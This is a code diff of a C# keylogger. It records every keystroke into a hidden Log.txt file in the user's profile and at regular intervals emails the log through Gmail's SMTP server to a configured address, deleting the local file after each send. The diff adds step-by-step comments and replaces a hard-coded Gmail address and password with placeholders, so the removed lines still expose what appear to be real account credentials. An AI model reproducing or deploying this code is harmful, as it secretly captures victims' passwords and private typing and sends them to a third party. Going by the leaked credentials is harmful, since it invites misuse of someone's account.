@@ -10,7 +10,7 @@ namespace KeyLogger
 {
     class Program
     {
-        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
+        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt"; //Create new file with log info
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -23,10 +23,10 @@ namespace KeyLogger
         {
             if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
             Timer t = new Timer();
-            t.Interval = 60000 * 0.5;
-            t.Elapsed += sendEmail;
-            t.AutoReset = true;
-            t.Enabled = true;
+            t.Interval = 60000 * 20; //Replace the 20 for the time in minutes before the Log is sent
+            t.Elapsed += sendEmail; //Send mail when the timer finishes
+            t.AutoReset = true; //Auto restart the timer
+            t.Enabled = true; //Is the timer enabled
 
             while (true)
             {
@@ -35,21 +35,22 @@ namespace KeyLogger
                     int key = GetAsyncKeyState(i);
                     if (key == 1 || key == -32767)
                     {
-                        StreamWriter file = new StreamWriter(path, true);
-                        File.SetAttributes(path, FileAttributes.Hidden);
-                        file.Write(verifyKey(i));
-                        file.Close();
-                        break;
+                        StreamWriter file = new StreamWriter(path, true); //Open the .txt file.
+                        File.SetAttributes(path, FileAttributes.Hidden); //Set .txt file path and visibility.
+                        file.Write(verifyKey(i)); //Write the key in the .txt file.
+                        file.Close(); //Close the write session.
+                        break; //Exit the loop once the key has been written.
                     }
                 }
             }
         }
 
-        private String verifyKey(int code)
+        private String verifyKey(int code) //Check the pressed key.
         {
             String key = "";
 
-            if (code == 8) key = "[Back]";
+            //Key codes in ASCII format.
+            if (code == 8) key = "[BACK]";
             else if (code == 9) key = "[TAB]";
             else if (code == 13) key = "[ENTER]";
             else if (code == 16) key = "[SHIFT]";
@@ -160,33 +161,33 @@ namespace KeyLogger
             else if (code == 226) key = "\\";
             else key = "[" + code + "]";
 
-            return key;
+            return key; //Return the pressed key.
         }
 
         private void sendEmail(Object source, ElapsedEventArgs e)
         {
             try
             {
-                MailMessage mail = new MailMessage();
-                SmtpClient server = new SmtpClient("smtp.gmail.com");
+                MailMessage mail = new MailMessage(); //Start a new instance of Mail.
+                SmtpClient server = new SmtpClient("smtp.gmail.com"); //Define the mail server.
 
-                mail.From = new MailAddress("marsopakeylog@gmail.com");
-                mail.To.Add("marsopakeylog@gmail.com");
+                mail.From = new MailAddress("EMAILSENDER"); //Who send the mail?
+                mail.To.Add("EMAILRECEIVER"); //Who receives the mail?
                 mail.Subject = "[Log: " + Environment.UserName + "]";
 
                 if (!File.Exists(path)) return;
-                StreamReader r = new StreamReader(path);
-                String content = r.ReadLine();
-                r.Close();
-                File.Delete(path);
-                mail.Body = content;
+                StreamReader r = new StreamReader(path); //Start a new StreamReader with the .txt path.
+                String content = r.ReadLine(); //Read the file.
+                r.Close(); //Close the reader.
+                File.Delete(path); //Delete the file once it has been read.
+                mail.Body = content; //Set the mail body (the data from the .txt file).
 
                 server.Port = 587;
-                server.Credentials = new NetworkCredential("marsopakeylog@gmail.com", "64225289");
-                server.EnableSsl = true;
-                server.Send(mail);
+                server.Credentials = new NetworkCredential("YOUREMAIL", "EMAILPASSWORD"); //Mail credentials for sending the Log.
+                server.EnableSsl = true; //Use SSL?
+                server.Send(mail); //Send the Log via mail.
             }
-            catch (Exception ex)
+            catch
             {
             }
         }
